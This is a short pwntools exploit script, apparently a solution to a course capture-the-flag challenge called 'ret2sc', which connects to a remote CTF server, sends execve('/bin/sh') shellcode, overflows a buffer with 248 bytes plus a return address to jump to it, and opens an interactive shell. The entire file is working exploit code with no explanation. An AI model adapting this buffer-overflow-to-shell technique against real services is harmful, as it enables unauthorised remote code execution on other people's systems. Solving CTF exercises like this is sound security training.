from pwn import *
context.arch = 'amd64'

#p = process('./02-ret2sc-a6a74cce51b034b6570e5416a38973c195d1b414')
host, port = "csie.ctf.tw", 10126
p = remote(host, port)

sc = asm('''
    xor rax,rax
    xor rdi,rdi
    xor rsi,rsi
    jmp str
execve:
    mov rdi,[rsp]
    mov rax,0x3b
    syscall
str:
    call execve
    .ascii "/bin/sh"
    .byte 0
''')

print p.recvuntil(':')
p.sendline(sc)
print p.recvuntil(':')
p.sendline('a' * 248 + p64(0x601080))
p.interactive()
